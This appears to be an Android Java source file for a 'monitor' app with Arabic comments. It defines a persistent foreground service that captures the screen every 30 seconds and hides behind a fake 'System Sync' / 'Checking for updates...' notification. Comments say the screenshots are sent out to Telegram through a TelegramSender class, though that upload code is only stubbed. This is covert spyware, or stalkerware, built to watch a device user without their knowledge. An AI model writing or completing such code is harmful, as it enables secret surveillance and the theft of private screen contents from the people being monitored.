package com.tom5.monitor;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.*;

public class ScreenService extends Service {
    private MediaProjection mMediaProjection;
    private VirtualDisplay mVirtualDisplay;
    private Handler mHandler;
    private int mWidth, mHeight, mDensity;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // إشعار الخدمة الأمامية لضمان عدم توقف التطبيق
        String CHANNEL_ID = "monitor_service";
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW);
        ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        Notification notification = new Notification.Builder(this, CHANNEL_ID).setContentTitle("Checking for updates...").build();
        startForeground(1, notification);

        setupProjection(intent);
        startCapturing();
        return START_STICKY;
    }

    private void setupProjection(Intent intent) {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mMediaProjection = manager.getMediaProjection(Activity.RESULT_OK, intent.getParcelableExtra("data"));
        
        DisplayMetrics metrics = new DisplayMetrics();
        ((WindowManager) getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay().getRealMetrics(metrics);
        mWidth = metrics.widthPixels; mHeight = metrics.heightPixels; mDensity = metrics.densityDpi;
    }

    private void startCapturing() {
        mHandler = new Handler();
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                takeScreenshot();
                mHandler.postDelayed(this, 30000); // يأخذ لقطة كل 30 ثانية لتوفير البيانات والبطارية
            }
        }, 1000);
    }

    private void takeScreenshot() {
        // كود سحب اللقطة وتحويلها لملف PNG ثم استدعاء TelegramSender
        // يتم الإرسال عبر TelegramSender.sendFile(imageFile);
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
